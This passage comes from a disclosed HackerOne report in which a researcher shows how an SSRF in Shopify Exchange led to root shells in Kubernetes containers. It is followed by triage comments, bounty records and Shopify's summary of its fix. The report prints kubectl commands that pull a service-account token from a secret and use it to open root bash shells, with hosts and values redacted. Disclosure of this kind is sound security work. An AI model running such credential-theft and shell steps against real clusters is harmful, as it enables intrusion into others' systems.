deleted\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI didn\u0026#39;t tried to delete running pods, obviously, I\u0026#39;m not sure if I would be able to delete them with user \u003ccode\u003e████████\u003c/code\u003e. However, it\u0026#39;s not possible to execute commands in this new pod or any other pod:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003ekubectl \u003cspan class=\"nt\"\u003e--client-certificate\u003c/span\u003e client.crt \u003cspan class=\"nt\"\u003e--client-key\u003c/span\u003e client.pem \u003cspan class=\"nt\"\u003e--certificate-authority\u003c/span\u003e ca.crt \u003cspan class=\"nt\"\u003e--server\u003c/span\u003e https://█████████ \u003cspan class=\"nb\"\u003eexec\u003c/span\u003e \u003cspan class=\"nt\"\u003e-it\u003c/span\u003e shell-demo \u003cspan class=\"nt\"\u003e--\u003c/span\u003e /bin/bash\n\nError from server \u003cspan class=\"o\"\u003e(\u003c/span\u003eForbidden\u003cspan class=\"o\"\u003e)\u003c/span\u003e: pods \u003cspan class=\"s2\"\u003e\u0026quot;shell-demo\u0026quot;\u003c/span\u003e is forbidden: User \u003cspan class=\"s2\"\u003e\u0026quot;███\u0026quot;\u003c/span\u003e cannot create pods/exec \u003cspan class=\"k\"\u003ein \u003c/span\u003ethe namespace \u003cspan class=\"s2\"\u003e\u0026quot;default\u0026quot;\u003c/span\u003e: Unknown user \u003cspan class=\"s2\"\u003e\u0026quot;███\u0026quot;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003eget secrets\u003c/code\u003e command doesn\u0026#39;t work, but it\u0026#39;s possible to describe a given pod and the get the secret using its name. That\u0026#39;s how I leaked the kubernetes.io service account token using the instance \u003ccode\u003e████\u003c/code\u003e from the namespace \u003ccode\u003e████\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003ekubectl \u003cspan class=\"nt\"\u003e--client-certificate\u003c/span\u003e client.crt \u003cspan class=\"nt\"\u003e--client-key\u003c/span\u003e client.pem \u003cspan class=\"nt\"\u003e--certificate-authority\u003c/span\u003e ca.crt \u003cspan class=\"nt\"\u003e--server\u003c/span\u003e https://███ describe pods/█████ \u003cspan class=\"nt\"\u003e-n\u003c/span\u003e █████████\n\nName:           ████████\nNamespace:      ██████\nNode:           ██████████\nStart Time:     Fri, 23 Mar 2018 13:53:13 +0000\nLabels:         █████\n                ████\n                █████\nAnnotations:    \u0026lt;none\u0026gt;\nStatus:         Running\nIP:             █████████\nControlled By:  █████\nContainers:\n  default-http-backend:\n    Container ID:   docker://███\n    Image:          ██████\n    Image ID:       docker-pullable://█████\n    Port:           ████/TCP\n    Host Port:      0/TCP\n    State:          Running\n      Started:      Sun, 22 Apr 2018 03:23:09 +0000\n    Last State:     Terminated\n      Reason:       Error\n      Exit Code:    2\n      Started:      Fri, 20 Apr 2018 23:39:21 +0000\n      Finished:     Sun, 22 Apr 2018 03:23:07 +0000\n    Ready:          True\n    Restart Count:  180\n    Limits:\n      cpu:     10m\n      memory:  20Mi\n    Requests:\n      cpu:        10m\n      memory:     20Mi\n    Liveness:     http-get http://:███/healthz \u003cspan class=\"nv\"\u003edelay\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e30s \u003cspan class=\"nb\"\u003etimeout\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e5s \u003cspan class=\"nv\"\u003eperiod\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e10s \u003cspan class=\"c\"\u003e#success=1 #failure=3\u003c/span\u003e\n    Environment:  \u0026lt;none\u0026gt;\n    Mounts:\n      ██████\nConditions:\n  Type           Status\n  Initialized    True\n  Ready          True\n  PodScheduled   True\nVolumes:\n ██████████:\n    Type:        Secret \u003cspan class=\"o\"\u003e(\u003c/span\u003ea volume populated by a Secret\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n    SecretName: ███████\n    Optional:    \u003cspan class=\"nb\"\u003efalse\n\u003c/span\u003eQoS Class:       Guaranteed\nNode-Selectors:  \u0026lt;none\u0026gt;\nTolerations:     node.kubernetes.io/not-ready:NoExecute \u003cspan class=\"k\"\u003efor \u003c/span\u003e300s\n                 node.kubernetes.io/unreachable:NoExecute \u003cspan class=\"k\"\u003efor \u003c/span\u003e300s\nEvents:          \u0026lt;none\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003ekubectl \u003cspan class=\"nt\"\u003e--client-certificate\u003c/span\u003e client.crt \u003cspan class=\"nt\"\u003e--client-key\u003c/span\u003e client.pem \u003cspan class=\"nt\"\u003e--certificate-authority\u003c/span\u003e ca.crt \u003cspan class=\"nt\"\u003e--server\u003c/span\u003e https://██████ get secret███████ \u003cspan class=\"nt\"\u003e-n\u003c/span\u003e ███████ \u003cspan class=\"nt\"\u003e-o\u003c/span\u003e yaml\n\napiVersion: v1\ndata:\n  ca.crt: ██████████\n  namespace: ████\n  token: ██████████\u003cspan class=\"o\"\u003e==\u003c/span\u003e\nkind: Secret\nmetadata:\n  annotations:\n    kubernetes.io/service-account.name: default\n    kubernetes.io/service-account.uid: ████\n  creationTimestamp: 2017-01-23T16:08:19Z\n  name:█████\n  namespace: ██████████\n  resourceVersion: \u003cspan class=\"s2\"\u003e\u0026quot;115481155\u0026quot;\u003c/span\u003e\n  selfLink: /api/v1/namespaces/████████/secrets/████\n  uid: █████████\n\u003cspan class=\"nb\"\u003etype\u003c/span\u003e: kubernetes.io/service-account-token\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd finally, it\u0026#39;s possible to use this token to get a shell in any container:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003ekubectl \u003cspan class=\"nt\"\u003e--certificate-authority\u003c/span\u003e ca.crt \u003cspan class=\"nt\"\u003e--server\u003c/span\u003e https://████ \u003cspan class=\"nt\"\u003e--token\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;█████.██████.███\u0026quot;\u003c/span\u003e \u003cspan class=\"nb\"\u003eexec\u003c/span\u003e \u003cspan class=\"nt\"\u003e-it\u003c/span\u003e w█████████ \u003cspan class=\"nt\"\u003e--\u003c/span\u003e /bin/bash\n\nDefaulting container name to web.\nUse \u003cspan class=\"s1\"\u003e\u0026#39;kubectl describe pod/w█████████\u0026#39;\u003c/span\u003e to see all of the containers \u003cspan class=\"k\"\u003ein \u003c/span\u003ethis pod.\n███████:/# \u003cspan class=\"nb\"\u003eid\n\u003c/span\u003e\u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0\u003cspan class=\"o\"\u003e(\u003c/span\u003eroot\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"nv\"\u003egid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0\u003cspan class=\"o\"\u003e(\u003c/span\u003eroot\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003egroups\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0\u003cspan class=\"o\"\u003e(\u003c/span\u003eroot\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n█████:/# \u003cspan class=\"nb\"\u003els\n\u003c/span\u003eapp  boot   dev  \u003cspan class=\"nb\"\u003eexec  \u003c/span\u003ekey  lib64  mnt  proc  run   srv  start  tmp  var\nbin  build  etc  home  lib  media  opt  root  sbin  ssl  sys    usr\n███████:/# \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003ekubectl \u003cspan class=\"nt\"\u003e--certificate-authority\u003c/span\u003e ca.crt \u003cspan class=\"nt\"\u003e--server\u003c/span\u003e https://███████ \u003cspan class=\"nt\"\u003e--token\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;█████.██████.█████████\u0026quot;\u003c/span\u003e \u003cspan class=\"nb\"\u003eexec\u003c/span\u003e \u003cspan class=\"nt\"\u003e-it\u003c/span\u003e ████████ \u003cspan class=\"nt\"\u003e-n\u003c/span\u003e ████████ \u003cspan class=\"nt\"\u003e--\u003c/span\u003e /bin/bash\n\nDefaulting container name to web.\nUse \u003cspan class=\"s1\"\u003e\u0026#39;kubectl describe pod/█████ -n █████\u0026#39;\u003c/span\u003e to see all of the containers \u003cspan class=\"k\"\u003ein \u003c/span\u003ethis pod.\nroot@████:/# \u003cspan class=\"nb\"\u003eid\n\u003c/span\u003e\u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0\u003cspan class=\"o\"\u003e(\u003c/span\u003eroot\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"nv\"\u003egid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0\u003cspan class=\"o\"\u003e(\u003c/span\u003eroot\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"nb\"\u003egroups\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0\u003cspan class=\"o\"\u003e(\u003c/span\u003eroot\u003cspan class=\"o\"\u003e)\u003c/span\u003e\nroot@████:/# \u003cspan class=\"nb\"\u003els\n\u003c/span\u003eapp  boot   dev  \u003cspan class=\"nb\"\u003eexec  \u003c/span\u003ekey  lib64  mnt  proc  run   srv  start  tmp  var\nbin  build  etc  home  lib  media  opt  root  sbin  ssl  sys    usr\nroot@█████:/# \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003chr\u003e\n\n\u003cp\u003e\u003cem\u003eHuge thanks to \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.linkedin.com%2Fin%2Fluis-maia-7714023a\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eLuís Maia\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003ca href=\"/redirect?url=http%3A%2F%2Fhackerone.com%2F0xfad0\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e0xfad0\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, for helping me build this █████\u003c/em\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003e\u003cstrong\u003eCRITICAL\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eThe hacker selected the \u003cstrong\u003eServer-Side Request Forgery (SSRF)\u003c/strong\u003e weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eCan internal services be reached bypassing network access control?\u003c/strong\u003e\u003cbr\u003e\nYes\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eWhat internal services were accessible?\u003c/strong\u003e\u003cbr\u003e\nGoogle Cloud Metadata\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eSecurity Impact\u003c/strong\u003e\u003cbr\u003e\nRCE\u003c/p\u003e\n","bounty_amount":"25000.0","formatted_bounty":"$25,000","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":482,"voters":["irvinlim","olihough86","nrockhouse","act1on3","porcupineyhairs","jin","v_jofra","jokebookservice1","xdms","sw33tlie","and 472 more..."],"severity":{"rating":"medium","score":6.9,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":6663,"asset_type":"URL","asset_identifier":"https://exchangemarketplace.com/","max_severity":"medium"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2652093,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for your report @0xacb, our engineering team is investigating and we will let you know when we have an update.","markdown_message":"\u003cp\u003eThanks for your report \u003ca href=\"/0xacb\"\u003e@0xacb\u003c/a\u003e, our engineering team is investigating and we will let you know when we have an update.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-23T00:21:22.826Z","updated_at":"2018-04-23T00:21:22.826Z","actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2653370,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"We've disabled the vulnerable service last night, thank you again for reporting this. As per our program rules, I'm paying this initial amount on triage, with the rest once the issue has been closed.","markdown_message":"\u003cp\u003eWe\u0026#39;ve disabled the vulnerable service last night, thank you again for reporting this. As per our program rules, I\u0026#39;m paying this initial amount on triage, with the rest once the issue has been closed.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-23T13:08:07.256Z","updated_at":"2018-04-23T13:08:07.256Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"0xacb","url":"/0xacb"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2653719,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the initial reward :)\n\nI forgot to mention, but I stopped exploring this when I achieved RCE. I'm not sure if I would be able to access other clusters on the project network (10.0.0.0)","markdown_message":"\u003cp\u003eThank you for the initial reward :)\u003c/p\u003e\n\n\u003cp\u003eI forgot to mention, but I stopped exploring this when I achieved RCE. I\u0026#39;m not sure if I would be able to access other clusters on the project network (10.0.0.0)\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-23T13:32:56.859Z","updated_at":"2018-04-23T13:32:56.859Z","actor":{"username":"0xacb","cleared":true,"url":"/0xacb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EeDdUUfFerzJfh1EjKx3SsEH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2673451,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @0xacb,\nthanks again for this report and the level of detail you provided, it was extremely helpful. I just wanted to provide a quick update. As you know, we immediately patched on the weekend. We are continuing to implement network changes to prevent the behaviour again should another SSRF vulnerability be discovered in the future. Given the sensitivity around this, we're taking our time to ensure proper mitigations. We're hoping to be able to resolve it soon but will keep you up to date on the progress.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/0xacb\"\u003e@0xacb\u003c/a\u003e,\u003cbr\u003e\nthanks again for this report and the level of detail you provided, it was extremely helpful. I just wanted to provide a quick update. As you know, we immediately patched on the weekend. We are continuing to implement network changes to prevent the behaviour again should another SSRF vulnerability be discovered in the future. Given the sensitivity around this, we\u0026#39;re taking our time to ensure proper mitigations. We\u0026#39;re hoping to be able to resolve it soon but will keep you up to date on the progress.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-27T17:25:11.338Z","updated_at":"2018-04-27T17:25:11.338Z","actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2673955,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the update, Peter!","markdown_message":"\u003cp\u003eThanks for the update, Peter!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-04-27T19:56:18.941Z","updated_at":"2018-04-27T19:56:18.941Z","actor":{"username":"0xacb","cleared":true,"url":"/0xacb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EeDdUUfFerzJfh1EjKx3SsEH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2757300,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @shopify-peteryaworski,\nAny updates on the progress?\nThank you!","markdown_message":"\u003cp\u003eHello \u003ca href=\"/shopify-peteryaworski\"\u003e@shopify-peteryaworski\u003c/a\u003e,\u003cbr\u003e\nAny updates on the progress?\u003cbr\u003e\nThank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-17T15:02:29.447Z","updated_at":"2018-05-17T15:02:29.447Z","actor":{"username":"0xacb","cleared":true,"url":"/0xacb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EeDdUUfFerzJfh1EjKx3SsEH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2762459,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @0xacb,\nsorry, we don't have an update. We will let you know when we do.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/0xacb\"\u003e@0xacb\u003c/a\u003e,\u003cbr\u003e\nsorry, we don\u0026#39;t have an update. We will let you know when we do.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-18T12:35:46.086Z","updated_at":"2018-05-18T12:35:46.086Z","actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2787629,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report @0xacb and your patience. As you know, we patched this immediately. We've finished implementing the network changes necessary to prevent this from occurring again. You should hear back from us shortly regarding the bounty.\n\nOn that note, this was a great find @0xacb! Thank you for taking the time to improve the security of Shopify. We greatly appreciate it. We hope to see more reports from you and for others to use this report as an great learning opportunity.","markdown_message":"\u003cp\u003eThanks again for your report \u003ca href=\"/0xacb\"\u003e@0xacb\u003c/a\u003e and your patience. As you know, we patched this immediately. We\u0026#39;ve finished implementing the network changes necessary to prevent this from occurring again. You should hear back from us shortly regarding the bounty.\u003c/p\u003e\n\n\u003cp\u003eOn that note, this was a great find \u003ca href=\"/0xacb\"\u003e@0xacb\u003c/a\u003e! Thank you for taking the time to improve the security of Shopify. We greatly appreciate it. We hope to see more reports from you and for others to use this report as an great learning opportunity.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-23T19:03:53.395Z","updated_at":"2018-05-23T19:03:53.395Z","actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"0xacb","url":"/0xacb"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2787920,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sounds great, @shopify-peteryaworski!\nIt was really a pleasure to work with you :)","markdown_message":"\u003cp\u003eSounds great, \u003ca href=\"/shopify-peteryaworski\"\u003e@shopify-peteryaworski\u003c/a\u003e!\u003cbr\u003e\nIt was really a pleasure to work with you :)\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-23T20:28:51.972Z","updated_at":"2018-05-23T20:28:51.972Z","actor":{"username":"0xacb","cleared":true,"url":"/0xacb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EeDdUUfFerzJfh1EjKx3SsEH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2788021,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again @0xacb!","markdown_message":"\u003cp\u003eThanks again \u003ca href=\"/0xacb\"\u003e@0xacb\u003c/a\u003e!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-23T20:59:27.091Z","updated_at":"2018-05-23T20:59:27.091Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"24500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"0xacb","url":"/0xacb"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2788022,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-23T20:59:54.263Z","updated_at":"2018-05-23T20:59:54.263Z","first_to_agree":true,"actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2788040,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sure! We can disclose this. Thanks for the huge bounty guys!!","markdown_message":"\u003cp\u003eSure! We can disclose this. Thanks for the huge bounty guys!!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-23T21:07:36.391Z","updated_at":"2018-05-23T21:07:36.391Z","actor":{"username":"0xacb","cleared":true,"url":"/0xacb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EeDdUUfFerzJfh1EjKx3SsEH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2788045,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-23T21:09:28.792Z","updated_at":"2018-05-23T21:09:28.792Z","actor":{"username":"0xacb","cleared":true,"url":"/0xacb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EeDdUUfFerzJfh1EjKx3SsEH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2788046,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-23T21:09:28.894Z","updated_at":"2018-05-23T21:09:28.894Z","actor":{"username":"0xacb","cleared":true,"url":"/0xacb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EeDdUUfFerzJfh1EjKx3SsEH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2788390,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"We'd also like to award you with some hacker-exclusive Shopify swag","markdown_message":"\u003cp\u003eWe\u0026#39;d also like to award you with some hacker-exclusive Shopify swag\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-23T21:35:58.802Z","updated_at":"2018-05-23T21:35:58.802Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"reporter":{"username":"0xacb","url":"/0xacb"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2788404,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you so much :)","markdown_message":"\u003cp\u003eThank you so much :)\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-23T21:38:01.491Z","updated_at":"2018-05-23T21:38:01.491Z","actor":{"username":"0xacb","cleared":true,"url":"/0xacb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EeDdUUfFerzJfh1EjKx3SsEH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2889815,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-15T17:38:21.550Z","updated_at":"2018-06-15T17:38:21.550Z","additional_data":{"old_severity":"Critical","new_severity":"Critical (10.0)","old_severity_id":143989,"new_severity_id":168616},"actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2889817,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-15T17:38:31.660Z","updated_at":"2018-06-15T17:38:31.660Z","actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"your-store.myshopify.com","new_scope":"https://exchangemarketplace.com/","genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":7516,"category":"team","content":"Shopify infrastructure is isolated into subsets of infrastructure. @0xacb reported it was possible to gain root access to any container in one particular subset by exploiting a server side request forgery bug in the screenshotting functionality of Shopify Exchange. Within an hour of receiving the report, we disabled the vulnerable service, began auditing applications in all subsets and remediating across all our infrastructure. The vulnerable subset did not include Shopify core.\n\nAfter auditing all services, we fixed the bug by deploying a metadata concealment proxy to disable access to metadata information. We also disabled access to internal IPs on all infrastructure subsets. We awarded this $25,000 as a Shopify Core RCE since some applications in this subset do have access to some Shopify core data and systems.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eShopify infrastructure is isolated into subsets of infrastructure. \u003ca href=\"/0xacb\"\u003e@0xacb\u003c/a\u003e reported it was possible to gain root access to any container in one particular subset by exploiting a server side request forgery bug in the screenshotting functionality of Shopify Exchange. Within an hour of receiving the report, we disabled the vulnerable service, began auditing applications in all subsets and remediating across all our infrastructure. The vulnerable subset did not include Shopify core.\u003c/p\u003e\n\n\u003cp\u003eAfter auditing all services, we fixed the bug by deploying a metadata concealment proxy to disable access to metadata information. We also disabled access to internal IPs on all infrastructure subsets. We awarded this $25,000 as a Shopify Core RCE since some applications in this subset do have access to some Shopify core data and systems.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}